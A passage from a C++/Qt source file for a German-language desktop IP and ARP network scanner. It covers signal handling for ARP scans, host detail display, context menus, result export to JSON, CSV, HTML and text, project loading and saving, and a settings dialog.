&EnhancedArpScanWorker::arpScanStarted,\r\n            this, [this](const QString &interface) {\r\n                addLogEntry(QString(\"ARP-Scan gestartet auf %1\").arg(interface), \"INFO\");\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &EnhancedArpScanWorker::arpEntryFound,\r\n            this, [this](const QString &ip, const QString &mac, const QString &vendor) {\r\n                // THREAD-SAFE: Alle UI-Updates im Main-Thread\r\n                QMetaObject::invokeMethod(this, [this, ip, mac, vendor]() {\r\n                    try {\r\n                        QTreeWidgetItem *arpItem = new QTreeWidgetItem();\r\n\r\n                        // Try to resolve hostname mit Timeout\r\n                        QString hostname = resolveHostnameWithTimeout(ip, 1000);\r\n\r\n                        arpItem->setText(0, hostname.isEmpty() ? QString(\"Host (%1)\").arg(ip) : hostname);\r\n                        arpItem->setText(1, ip);\r\n                        arpItem->setText(2, mac.toUpper());\r\n                        arpItem->setText(3, vendor.isEmpty() ? \"Unbekannter Hersteller\" : vendor);\r\n                        arpItem->setText(4, interfaceCombo->currentText().split(\" (\").first());\r\n                        arpItem->setText(5, \"ARP-Eintrag\");\r\n                        arpItem->setText(6, QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n\r\n                        // Enhanced color coding based on vendor\r\n                        QColor backgroundColor = getVendorColor(vendor);\r\n                        arpItem->setBackground(3, backgroundColor);\r\n\r\n                        // WICHTIG: Prüfen ob networkTree noch existiert\r\n                        if (networkTree) {\r\n                            networkTree->addTopLevelItem(arpItem);\r\n                            updateNetworkStatistics(); // Update statistics\r\n                        }\r\n\r\n                        addLogEntry(QString(\"ARP-Eintrag: %1 -> %2 (%3)\")\r\n                                        .arg(ip, mac.toUpper(), vendor), \"SUCCESS\");\r\n\r\n                    } catch (const std::exception& e) {\r\n                        addLogEntry(QString(\"Fehler beim Hinzufügen von ARP-Eintrag: %1\").arg(e.what()), \"ERROR\");\r\n                    } catch (...) {\r\n                        addLogEntry(\"Unbekannter Fehler beim Hinzufügen von ARP-Eintrag\", \"ERROR\");\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &EnhancedArpScanWorker::arpScanProgress,\r\n            this, [this](int scannedEntries, int totalEntries) {\r\n                QMetaObject::invokeMethod(this, [this, scannedEntries, totalEntries]() {\r\n                    if (totalEntries > 0) {\r\n                        int progress = (scannedEntries * 100) / totalEntries;\r\n                        statusBar()->showMessage(\r\n                            QString(\"ARP-Scan Fortschritt: %1% (%2/%3)\")\r\n                                .arg(progress).arg(scannedEntries).arg(totalEntries));\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &EnhancedArpScanWorker::arpScanCompleted,\r\n            this, [this](int entriesFound) {\r\n                // KRITISCHER FIX: UI-Updates im Main-Thread mit Exception Handling\r\n                QMetaObject::invokeMethod(this, [this, entriesFound]() {\r\n                    try {\r\n                        addLogEntry(QString(\"ARP-Scan abgeschlossen - %1 Einträge gefunden\").arg(entriesFound), \"SUCCESS\");\r\n                        statusBar()->showMessage(QString(\"ARP-Scan abgeschlossen - %1 Geräte gefunden\").arg(entriesFound));\r\n\r\n                        // UI wieder aktivieren\r\n                        if (arpScanButton) {\r\n                            arpScanButton->setEnabled(true);\r\n                            arpScanButton->setText(\"📡 ARP Scan\");\r\n                        }\r\n\r\n                        // Auto-resize columns - mit Null-Check\r\n                        if (networkTree) {\r\n                            for (int i = 0; i < networkTree->columnCount(); ++i) {\r\n                                networkTree->resizeColumnToContents(i);\r\n                            }\r\n                        }\r\n\r\n                        // Success dialog nur bei Fund von Einträgen\r\n                        if (entriesFound > 0) {\r\n                            QMessageBox::information(this, \"✅ ARP-Scan Abgeschlossen\",\r\n                                                     QString(\"ARP-Scan erfolgreich!\\n\\n\"\r\n                                                             \"📊 ARP-Einträge gefunden: %1\\n\"\r\n                                                             \"🔌 Interface: %2\")\r\n                                                         .arg(entriesFound)\r\n                                                         .arg(interfaceCombo->currentText()));\r\n                        } else {\r\n                            QMessageBox::information(this, \"ℹ️ ARP-Scan Abgeschlossen\",\r\n                                                     QString(\"ARP-Scan abgeschlossen.\\n\\n\"\r\n                                                             \"Keine neuen ARP-Einträge gefunden.\\n\"\r\n                                                             \"Möglicherweise sind keine anderen Geräte aktiv\\n\"\r\n                                                             \"oder das Netzwerk ist sehr ruhig.\"));\r\n                        }\r\n\r\n                    } catch (const std::exception& e) {\r\n                        addLogEntry(QString(\"Fehler beim Abschließen des ARP-Scans: %1\").arg(e.what()), \"ERROR\");\r\n\r\n                        // Failsafe: Button wieder aktivieren\r\n                        if (arpScanButton) {\r\n                            arpScanButton->setEnabled(true);\r\n                            arpScanButton->setText(\"📡 ARP Scan\");\r\n                        }\r\n                    } catch (...) {\r\n                        addLogEntry(\"Unbekannter Fehler beim Abschließen des ARP-Scans\", \"ERROR\");\r\n\r\n                        // Failsafe: Button wieder aktivieren\r\n                        if (arpScanButton) {\r\n                            arpScanButton->setEnabled(true);\r\n                            arpScanButton->setText(\"📡 ARP Scan\");\r\n                        }\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    // WICHTIGER FIX: Worker mit niedrigerer Priorität starten\r\n    threadPool->start(worker, QThread::LowPriority);\r\n}\r\nQString IpScanner::resolveHostnameWithTimeout(const QString &ip, int timeoutMs)\r\n{\r\n    try {\r\n        // Schneller Hostname-Lookup mit Timeout\r\n        QHostInfo hostInfo = QHostInfo::fromName(ip);\r\n        if (hostInfo.error() == QHostInfo::NoError && !hostInfo.hostName().isEmpty()) {\r\n            QString hostname = hostInfo.hostName();\r\n            if (hostname != ip && !hostname.isEmpty()) {\r\n                return hostname;\r\n            }\r\n        }\r\n    } catch (...) {\r\n        // Ignore hostname resolution errors\r\n    }\r\n    return QString();\r\n}\r\n\r\nQColor IpScanner::getVendorColor(const QString &vendor)\r\n{\r\n    // Color coding based on vendor for better visualization\r\n    if (vendor.contains(\"Apple\", Qt::CaseInsensitive)) {\r\n        return QColor(169, 169, 169, 100); // Silver for Apple\r\n    } else if (vendor.contains(\"Microsoft\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"Intel\", Qt::CaseInsensitive)) {\r\n        return QColor(0, 123, 255, 100); // Blue for Microsoft/Intel\r\n    } else if (vendor.contains(\"Samsung\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"LG\", Qt::CaseInsensitive)) {\r\n        return QColor(40, 167, 69, 100); // Green for mobile vendors\r\n    } else if (vendor.contains(\"Cisco\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"TP-Link\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"D-Link\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"Netgear\", Qt::CaseInsensitive)) {\r\n        return QColor(255, 165, 0, 100); // Orange for network equipment\r\n    } else if (vendor.contains(\"VMware\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"VirtualBox\", Qt::CaseInsensitive) ||\r\n               vendor.contains(\"QEMU\", Qt::CaseInsensitive)) {\r\n        return QColor(138, 43, 226, 100); // Purple for virtualization\r\n    } else {\r\n        return QColor(108, 117, 125, 100); // Gray for others\r\n    }\r\n}\r\n\r\nQString IpScanner::resolveHostname(const QString &ip)\r\n{\r\n    QHostInfo hostInfo = QHostInfo::fromName(ip);\r\n    if (hostInfo.error() == QHostInfo::NoError && !hostInfo.hostName().isEmpty()) {\r\n        QString hostname = hostInfo.hostName();\r\n        if (hostname != ip) { // Only return if it's actually resolved\r\n            return hostname;\r\n        }\r\n    }\r\n    return QString();\r\n}\r\nvoid IpScanner::whoIs()\r\n{\r\n    QMessageBox::information(this, \"🔍 WHOIS\", \"WHOIS-Funktion wird in der nächsten Version implementiert\");\r\n    addLogEntry(\"WHOIS aufgerufen (noch nicht implementiert)\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::onItemSelectionChanged()\r\n{\r\n    QTreeWidgetItem *currentItem = hostTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        hostDetailsEdit->clear();\r\n        return;\r\n    }\r\n\r\n    QString ip = currentItem->text(0);\r\n    QString hostname = currentItem->text(1);\r\n    QString mac = currentItem->text(2);\r\n    QString vendor = currentItem->text(3);\r\n    QString status = currentItem->text(4);\r\n    QString responseTime = currentItem->text(5);\r\n    QString ports = currentItem->text(6);\r\n    QString os = currentItem->text(7);\r\n    QString lastSeen = currentItem->text(8);\r\n    QString services = currentItem->text(9);\r\n\r\n    QString details = QString(R\"(\r\n<h3>🖥️ Host Informationen</h3>\r\n<table border=\"0\" cellpadding=\"3\">\r\n<tr><td><b>📍 IP Adresse:</b></td><td>%1</td></tr>\r\n<tr><td><b>🏷️ Hostname:</b></td><td>%2</td></tr>\r\n<tr><td><b>🔧 MAC Adresse:</b></td><td>%3</td></tr>\r\n<tr><td><b>🏭 Hersteller:</b></td><td>%4</td></tr>\r\n<tr><td><b>🟢 Status:</b></td><td>%5</td></tr>\r\n<tr><td><b>⏱️ Antwortzeit:</b></td><td>%6</td></tr>\r\n<tr><td><b>🖥️ Betriebssystem:</b></td><td>%7</td></tr>\r\n<tr><td><b>🕐 Letzte Aktivität:</b></td><td>%8</td></tr>\r\n</table>\r\n\r\n<h4>🔌 Offene Ports:</h4>\r\n<p>%9</p>\r\n\r\n<h4>⚙️ Services:</h4>\r\n<p>%10</p>\r\n\r\n<h4>📝 Aktionen:</h4>\r\n<p>Doppelklick für Schnellaktionen</p>\r\n    )\").arg(ip, hostname, mac, vendor, status, responseTime, os, lastSeen,\r\n                               ports.isEmpty() ? \"Keine erkannt\" : ports,\r\n                               services.isEmpty() ? \"Keine erkannt\" : services);\r\n\r\n    hostDetailsEdit->setHtml(details);\r\n}\r\n\r\nvoid IpScanner::onItemDoubleClicked(QTreeWidgetItem *item, int column)\r\n{\r\n    Q_UNUSED(column)\r\n    if (!item) return;\r\n\r\n    QString ip = item->text(0);\r\n\r\n    QMenu menu(this);\r\n    menu.setStyleSheet(\"QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }\");\r\n\r\n    menu.addAction(\"🏓 Host pingen\", [this, ip]() {\r\n        targetEdit->setText(ip);\r\n        pingHost();\r\n    });\r\n    menu.addAction(\"🔌 Ports scannen\", [this, ip]() {\r\n        targetEdit->setText(ip);\r\n        portScan();\r\n    });\r\n    menu.addAction(\"🌐 Im Browser öffnen\", [ip]() {\r\n        QDesktopServices::openUrl(QUrl(QString(\"http://%1\").arg(ip)));\r\n    });\r\n    menu.addAction(\"📋 IP kopieren\", [this, ip]() {\r\n        QApplication::clipboard()->setText(ip);\r\n        addLogEntry(QString(\"IP %1 in Zwischenablage kopiert\").arg(ip), \"INFO\");\r\n    });\r\n\r\n    menu.exec(QCursor::pos());\r\n}\r\n\r\nvoid IpScanner::showContextMenu(const QPoint &pos)\r\n{\r\n    QTreeWidgetItem *item = hostTreeWidget->itemAt(pos);\r\n    if (!item) return;\r\n\r\n    QString ip = item->text(0);\r\n\r\n    QMenu menu(this);\r\n    menu.setStyleSheet(\"QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }\");\r\n\r\n    menu.addAction(\"📋 IP Adresse kopieren\", [this, ip]() {\r\n        QApplication::clipboard()->setText(ip);\r\n        addLogEntry(QString(\"IP %1 kopiert\").arg(ip), \"INFO\");\r\n    });\r\n\r\n    menu.addAction(\"🗑️ Host entfernen\", [this, item, ip]() {\r\n        delete item;\r\n        for (int i = 0; i < discoveredHosts.size(); ++i) {\r\n            if (discoveredHosts[i].ip == ip) {\r\n                discoveredHosts.removeAt(i);\r\n                break;\r\n            }\r\n        }\r\n        addLogEntry(QString(\"Host %1 entfernt\").arg(ip), \"INFO\");\r\n    });\r\n\r\n    menu.addSeparator();\r\n    menu.addAction(\"🏓 Ping\", [this, ip]() {\r\n        targetEdit->setText(ip);\r\n        pingHost();\r\n    });\r\n    menu.addAction(\"🔌 Port Scan\", [this, ip]() {\r\n        targetEdit->setText(ip);\r\n        portScan();\r\n    });\r\n\r\n    menu.exec(hostTreeWidget->mapToGlobal(pos));\r\n}\r\n\r\nvoid IpScanner::exportResults()\r\n{\r\n    if (discoveredHosts.isEmpty()) {\r\n        QMessageBox::information(this, \"📤 Export\", \"Keine Ergebnisse zum Exportieren vorhanden\");\r\n        return;\r\n    }\r\n\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"📤 Ergebnisse Exportieren\",\r\n                                                    QString(\"scan_results_%1.json\").arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"JSON Files (*.json);;CSV Files (*.csv);;Text Files (*.txt);;HTML Files (*.html)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::WriteOnly)) {\r\n        QMessageBox::warning(this, \"❌ Export Fehler\", \"Datei konnte nicht zum Schreiben geöffnet werden\");\r\n        return;\r\n    }\r\n\r\n    QTextStream stream(&file);\r\n\r\n    if (fileName.endsWith(\".json\")) {\r\n        // Export as JSON\r\n        QJsonDocument doc = createJsonReport();\r\n        file.write(doc.toJson());\r\n        addLogEntry(QString(\"Ergebnisse als JSON exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    }\r\n    else if (fileName.endsWith(\".csv\")) {\r\n        // Export as CSV\r\n        stream << \"IP Adresse,Hostname,MAC Adresse,Hersteller,Status,Antwortzeit,Offene Ports,Betriebssystem,Letzte Aktivität,Services\\n\";\r\n\r\n        for (const HostInfo &host : discoveredHosts) {\r\n            stream << QString(\"%1,%2,%3,%4,%5,%6,\\\"%7\\\",%8,%9,\\\"%10\\\"\\n\")\r\n            .arg(host.ip,\r\n                 host.hostname.isEmpty() ? \"Unbekannt\" : host.hostname,\r\n                 host.macAddress.isEmpty() ? \"N/A\" : host.macAddress,\r\n                 host.vendor.isEmpty() ? \"Unbekannt\" : host.vendor,\r\n                 host.isAlive ? \"Online\" : \"Offline\",\r\n                 QString::number(host.responseTime),\r\n                 host.openPorts.join(\";\"),\r\n                 host.os.isEmpty() ? \"Unbekannt\" : host.os,\r\n                 host.lastSeen.toString(\"dd.MM.yyyy hh:mm:ss\"),\r\n                 host.services.join(\";\"));\r\n        }\r\n        addLogEntry(QString(\"Ergebnisse als CSV exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    }\r\n    else if (fileName.endsWith(\".html\")) {\r\n        // Export as HTML\r\n        stream << R\"(<!DOCTYPE html>\r\n<html>\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <title>IP Scanner Ergebnisse</title>\r\n    <style>\r\n        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 20px; }\r\n        h1 { color: #0078d4; text-align: center; }\r\n        table { border-collapse: collapse; width: 100%; margin: 20px 0; }\r\n        th, td { border: 1px solid #404040; padding: 12px; text-align: left; }\r\n        th { background-color: #0078d4; color: white; }\r\n        tr:nth-child(even) { background-color: #2d2d2d; }\r\n        .online { color: #00ff00; font-weight: bold; }\r\n        .offline { color: #ff0000; font-weight: bold; }\r\n        .summary { background: #2d2d2d; padding: 15px; border-radius: 5px; margin: 20px 0; }\r\n    </style>\r\n</head>\r\n<body>\r\n    <h1>🔍 IP Scanner Ergebnisse</h1>\r\n    <div class=\"summary\">\r\n        <h3>📊 Zusammenfassung</h3>\r\n        <p><strong>Scan-Ziel:</strong> )\" << currentTarget << R\"(</p>\r\n        <p><strong>Datum:</strong> )\" << QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\") << R\"(</p>\r\n        <p><strong>Gefundene Hosts:</strong> )\" << discoveredHosts.size() << R\"(</p>\r\n    </div>\r\n    <table>\r\n        <tr>\r\n            <th>IP Adresse</th>\r\n            <th>Hostname</th>\r\n            <th>Status</th>\r\n            <th>Antwortzeit</th>\r\n            <th>Offene Ports</th>\r\n            <th>Betriebssystem</th>\r\n            <th>Letzte Aktivität</th>\r\n        </tr>)\";\r\n\r\n        for (const HostInfo &host : discoveredHosts) {\r\n            stream << QString(R\"(\r\n        <tr>\r\n            <td>%1</td>\r\n            <td>%2</td>\r\n            <td class=\"%3\">%4</td>\r\n            <td>%5</td>\r\n            <td>%6</td>\r\n            <td>%7</td>\r\n            <td>%8</td>\r\n        </tr>)\")\r\n                          .arg(host.ip,\r\n                               host.hostname.isEmpty() ? \"Unbekannt\" : host.hostname,\r\n                               host.isAlive ? \"online\" : \"offline\",\r\n                               host.isAlive ? \"🟢 Online\" : \"🔴 Offline\",\r\n                               host.responseTime >= 0 ? QString(\"%1 ms\").arg(host.responseTime) : \"Timeout\",\r\n                               host.openPorts.isEmpty() ? \"Keine\" : host.openPorts.join(\", \"),\r\n                               host.os.isEmpty() ? \"Unbekannt\" : host.os,\r\n                               host.lastSeen.toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n        }\r\n\r\n        stream << R\"(\r\n    </table>\r\n    <div class=\"summary\">\r\n        <p><em>Generiert mit Advanced IP Scanner v2.0</em></p>\r\n    </div>\r\n</body>\r\n</html>)\";\r\n        addLogEntry(QString(\"Ergebnisse als HTML exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    }\r\n    else {\r\n        // Export as text\r\n        stream << \"🔍 IP Scanner Ergebnisse\\n\";\r\n        stream << \"========================\\n\\n\";\r\n        stream << QString(\"📅 Datum: %1\\n\").arg(QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n        stream << QString(\"🎯 Ziel: %1\\n\").arg(currentTarget);\r\n        stream << QString(\"📊 Gefundene Hosts: %1\\n\\n\").arg(discoveredHosts.size());\r\n\r\n        for (const HostInfo &host : discoveredHosts) {\r\n            stream << QString(\"IP: %1\\n\").arg(host.ip);\r\n            stream << QString(\"Hostname: %1\\n\").arg(host.hostname.isEmpty() ? \"Unbekannt\" : host.hostname);\r\n            stream << QString(\"Status: %1\\n\").arg(host.isAlive ? \"🟢 Online\" : \"🔴 Offline\");\r\n            stream << QString(\"Antwortzeit: %1 ms\\n\").arg(host.responseTime);\r\n            stream << QString(\"Offene Ports: %1\\n\").arg(host.openPorts.isEmpty() ? \"Keine\" : host.openPorts.join(\", \"));\r\n            stream << QString(\"Betriebssystem: %1\\n\").arg(host.os.isEmpty() ? \"Unbekannt\" : host.os);\r\n            stream << QString(\"Letzte Aktivität: %1\\n\").arg(host.lastSeen.toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n            stream << \"----------------------------------------\\n\";\r\n        }\r\n        addLogEntry(QString(\"Ergebnisse als Text exportiert: %1\").arg(fileName), \"SUCCESS\");\r\n    }\r\n\r\n    QMessageBox::information(this, \"✅ Export Erfolgreich\",\r\n                             QString(\"Ergebnisse erfolgreich exportiert nach:\\n%1\\n\\n📊 %2 Hosts exportiert\")\r\n                                 .arg(fileName).arg(discoveredHosts.size()));\r\n}\r\n\r\nvoid IpScanner::loadProject()\r\n{\r\n    QString fileName = QFileDialog::getOpenFileName(this,\r\n                                                    \"📂 Projekt Laden\",\r\n                                                    \"\",\r\n                                                    \"Project Files (*.json)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QFile file(fileName);\r\n    if (!file.open(QIODevice::ReadOnly)) {\r\n        QMessageBox::warning(this, \"❌ Laden Fehler\", \"Datei konnte nicht gelesen werden\");\r\n        return;\r\n    }\r\n\r\n    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());\r\n    if (doc.isNull()) {\r\n        QMessageBox::warning(this, \"❌ Format Fehler\", \"Ungültiges JSON Format\");\r\n        return;\r\n    }\r\n\r\n    QJsonObject root = doc.object();\r\n\r\n    // Load project data\r\n    currentTarget = root[\"target\"].toString();\r\n    targetEdit->setText(currentTarget);\r\n\r\n    // Clear current results\r\n    clearResults();\r\n\r\n    // Load hosts\r\n    QJsonArray hostsArray = root[\"hosts\"].toArray();\r\n    for (const auto &value : hostsArray) {\r\n        QJsonObject hostObj = value.toObject();\r\n\r\n        HostInfo host;\r\n        host.ip = hostObj[\"ip\"].toString();\r\n        host.hostname = hostObj[\"hostname\"].toString();\r\n        host.macAddress = hostObj[\"mac\"].toString();\r\n        host.vendor = hostObj[\"vendor\"].toString();\r\n        host.isAlive = hostObj[\"alive\"].toBool();\r\n        host.responseTime = hostObj[\"responseTime\"].toInt();\r\n        host.os = hostObj[\"os\"].toString();\r\n        host.lastSeen = QDateTime::fromString(hostObj[\"lastSeen\"].toString(), Qt::ISODate);\r\n        host.notes = hostObj[\"notes\"].toString();\r\n\r\n        // Load ports and services\r\n        QJsonArray portsArray = hostObj[\"openPorts\"].toArray();\r\n        for (const auto &portValue : portsArray) {\r\n            host.openPorts.append(portValue.toString());\r\n        }\r\n\r\n        QJsonArray servicesArray = hostObj[\"services\"].toArray();\r\n        for (const auto &serviceValue : servicesArray) {\r\n            host.services.append(serviceValue.toString());\r\n        }\r\n\r\n        // Add to results\r\n        onHostFound(host);\r\n    }\r\n\r\n    addLogEntry(QString(\"Projekt geladen: %1 (%2 Hosts)\").arg(fileName).arg(discoveredHosts.size()), \"SUCCESS\");\r\n    QMessageBox::information(this, \"✅ Projekt Geladen\",\r\n                             QString(\"Projekt erfolgreich geladen:\\n%1\\n\\n📊 %2 Hosts wiederhergestellt\")\r\n                                 .arg(fileName).arg(discoveredHosts.size()));\r\n}\r\n\r\nvoid IpScanner::saveProject()\r\n{\r\n    if (discoveredHosts.isEmpty()) {\r\n        QMessageBox::information(this, \"💾 Projekt Speichern\", \"Keine Daten zum Speichern vorhanden\");\r\n        return;\r\n    }\r\n\r\n    QString fileName = QFileDialog::getSaveFileName(this,\r\n                                                    \"💾 Projekt Speichern\",\r\n                                                    QString(\"project_%1.json\").arg(QDateTime::currentDateTime().toString(\"yyyyMMdd_hhmmss\")),\r\n                                                    \"Project Files (*.json)\");\r\n\r\n    if (fileName.isEmpty()) return;\r\n\r\n    QJsonDocument doc = createJsonReport();\r\n\r\n    QFile file(fileName);\r\n    if (file.open(QIODevice::WriteOnly)) {\r\n        file.write(doc.toJson());\r\n        addLogEntry(QString(\"Projekt gespeichert: %1\").arg(fileName), \"SUCCESS\");\r\n        QMessageBox::information(this, \"✅ Projekt Gespeichert\",\r\n                                 QString(\"Projekt erfolgreich gespeichert:\\n%1\").arg(fileName));\r\n    } else {\r\n        QMessageBox::warning(this, \"❌ Speichern Fehler\", \"Datei konnte nicht gespeichert werden\");\r\n    }\r\n}\r\n\r\nQJsonDocument IpScanner::createJsonReport()\r\n{\r\n    QJsonObject root;\r\n    root[\"scanner\"] = \"Advanced IP Scanner\";\r\n    root[\"version\"] = \"2.0\";\r\n    root[\"timestamp\"] = QDateTime::currentDateTime().toString(Qt::ISODate);\r\n    root[\"target\"] = currentTarget;\r\n    root[\"totalScanned\"] = totalHosts;\r\n    root[\"hostsFound\"] = discoveredHosts.size();\r\n\r\n    QJsonArray hostsArray;\r\n    for (const HostInfo &host : discoveredHosts) {\r\n        QJsonObject hostObj;\r\n        hostObj[\"ip\"] = host.ip;\r\n        hostObj[\"hostname\"] = host.hostname;\r\n        hostObj[\"mac\"] = host.macAddress;\r\n        hostObj[\"vendor\"] = host.vendor;\r\n        hostObj[\"alive\"] = host.isAlive;\r\n        hostObj[\"responseTime\"] = host.responseTime;\r\n        hostObj[\"os\"] = host.os;\r\n        hostObj[\"lastSeen\"] = host.lastSeen.toString(Qt::ISODate);\r\n        hostObj[\"notes\"] = host.notes;\r\n\r\n        QJsonArray portsArray;\r\n        for (const QString &port : host.openPorts) {\r\n            portsArray.append(port);\r\n        }\r\n        hostObj[\"openPorts\"] = portsArray;\r\n\r\n        QJsonArray servicesArray;\r\n        for (const QString &service : host.services) {\r\n            servicesArray.append(service);\r\n        }\r\n        hostObj[\"services\"] = servicesArray;\r\n\r\n        hostsArray.append(hostObj);\r\n    }\r\n\r\n    root[\"hosts\"] = hostsArray;\r\n    return QJsonDocument(root);\r\n}\r\n\r\nvoid IpScanner::showSettings()\r\n{\r\n    QDialog *settingsDialog = new QDialog(this);\r\n    settingsDialog->setWindowTitle(\"⚙️ Einstellungen\");\r\n    settingsDialog->setModal(true);\r\n    settingsDialog->resize(500, 400);\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(settingsDialog);\r\n\r\n    // Scan Settings Group\r\n    QGroupBox *scanGroup = new QGroupBox(\"🔍 Scan Einstellungen\");\r\n    QFormLayout *scanLayout = new QFormLayout(scanGroup);\r\n\r\n    QSpinBox *defaultThreads = new QSpinBox();\r\n    defaultThreads->setRange(1, 200);\r\n    defaultThreads->setValue(threadsSpinBox->value());\r\n    scanLayout->addRow(\"Standard Threads:\", defaultThreads);\r\n\r\n    QSpinBox *defaultTimeout = new QSpinBox();\r\n    defaultTimeout->setRange(100, 10000);\r\n    defaultTimeout->setSuffix(\" ms\");\r\n    defaultTimeout->setValue(timeoutSpinBox->value());\r\n    scanLayout->addRow(\"Standard Timeout:\", defaultTimeout);\r\n\r\n    QCheckBox *autoSaveResults = new QCheckBox(\"Ergebnisse automatisch speichern\");\r\n    scanLayout->addRow(autoSaveResults);\r\n\r\n    // UI Settings Group\r\n    QGroupBox *uiGroup = new QGroupBox(\"🎨 Interface Einstellungen\");\r\n    QFormLayout *uiLayout = new QFormLayout(uiGroup);\r\n\r\n    QCheckBox *showTooltips = new QCheckBox(\"Tooltips anzeigen\");\r\n    showTooltips->setChecked(true);\r\n    uiLayout->addRow(showTooltips);\r\n\r\n    QCheckBox *confirmActions = new QCheckBox(\"Aktionen bestätigen\");\r\n    confirmActions->setChecked(true);\r\n    uiLayout->addRow(confirmActions);\r\n\r\n    // Buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    QPushButton *okButton = new QPushButton(\"✅ OK\");\r\n    QPushButton *cancelButton = new QPushButton(\"❌ Abbrechen\");\r\n    QPushButton *resetButton = new QPushButton(\"🔄 Zurücksetzen\");\r\n\r\n    buttonLayout->addWidget(resetButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(okButton);\r\n    buttonLayout->addWidget(cancelButton);\r\n\r\n    layout->addWidget(scanGroup);\r\n    layout->addWidget(uiGroup);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    connect(okButton, &QPushButton::clicked, [=]() {\r\n        threadsSpinBox->setValue(defaultThreads->value());\r\n        timeoutSpinBox->setValue(defaultTimeout->value());\r\n        saveSettings();\r\n        settingsDialog->accept();\r\n        addLogEntry(\"Einstellungen aktualisiert\", \"SUCCESS\");\r\n    });\r\n\r\n    connect(cancelButton, &QPushButton::clicked, settingsDialog, &QDialog::reject);\r\n\r\n    connect(resetButton, &QPushButton::clicked, [=]() {\r\n        defaultThreads->setValue(50);\r\n        defaultTimeout->setValue(3000);\r\n        addLogEntry(\"Einstellungen zurückgesetzt\", \"INFO\");\r\n    });\r\n\r\n    settingsDialog->exec();\r\n}\r\n\r\n\r\nvoid IpScanner::copyToClipboard()\r\n{\r\n    QTreeWidgetItem *currentItem = hostTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        QMessageBox::information(this, \"📋 Kopieren\", \"Bitte wählen Sie zuerst einen Host aus\");\r\n        return;\r\n    }\r\n\r\n    QString ip = currentItem->text(0);\r\n    QApplication::clipboard()->setText(ip);\r\n    addLogEntry(QString(\"IP %1 in Zwischenablage kopiert\").arg(ip), \"SUCCESS\");\r\n\r\n    // Show temporary status message\r\n    statusBar()->showMessage(QString(\"IP %1 kopiert\").arg(ip), 2000);\r\n}\r\n\r\nvoid IpScanner::removeHost()\r\n{\r\n    QTreeWidgetItem *currentItem = hostTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        QMessageBox::information(this, \"🗑️ Entfernen\", \"Bitte wählen Sie zuerst einen Host aus\");\r\n        return;\r\n    }\r\n\r\n    QString ip = currentItem->text(0);\r\n\r\n    // Confirmation dialog\r\n    int ret = QMessageBox::question(this, \"🗑️ Host Entfernen\",\r\n                                    QString(\"Möchten Sie den Host %1 wirklich aus den Ergebnissen entfernen?\").arg(ip),\r\n                                    QMessageBox::Yes | QMessageBox::No);\r\n\r\n    if (ret == QMessageBox::Yes) {\r\n        // Remove from tree\r\n        delete currentItem;\r\n\r\n        // Remove from discovered hosts list\r\n        for (int i = 0; i < discoveredHosts.size(); ++i) {\r\n            if (discoveredHosts[i].ip == ip) {\r\n                discoveredHosts.removeAt(i);\r\n                break;\r\n            }\r\n        }\r\n\r\n        // Update found hosts counter\r\n        foundHostsLabel->setText(QString(\"Gefunden: %1\").arg(discoveredHosts.size()));\r\n\r\n        addLogEntry(QString(\"Host %1 aus Ergebnissen entfernt\").arg(ip), \"INFO\");\r\n        statusBar()->showMessage(QString(\"Host %1 entfernt\").arg(ip), 2000);\r\n    }\r\n}\r\n\r\nvoid IpScanner::addToFavorites()\r\n{\r\n    QTreeWidgetItem *currentItem = hostTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        QMessageBox::information(this, \"⭐ Favoriten\", \"Bitte wählen Sie zuerst einen Host aus\");\r\n        return;\r\n    }\r\n\r\n    QString ip = currentItem->text(0);\r\n    QString hostname = currentItem->text(1);\r\n\r\n    // For now, we'll just show a message. In a full implementation,\r\n    // this would save to a favorites list in settings\r\n    QMessageBox::information(this, \"⭐ Zu Favoriten hinzugefügt\",\r\n                             QString(\"Host wurde zu Favoriten hinzugefügt:\\n\\n\"\r\n                                     \"🔗 IP: %1\\n\"\r\n                                     \"🏷️ Hostname: %2\\n\\n\"\r\n                                     \"💡 Favoriten-Funktionalität wird in der nächsten Version erweitert.\")\r\n                                 .arg(ip, hostname.isEmpty() ? \"Unbekannt\" : hostname));\r\n\r\n    addLogEntry(QString(\"Host %1 (%2) zu Favoriten hinzugefügt\").arg(ip, hostname), 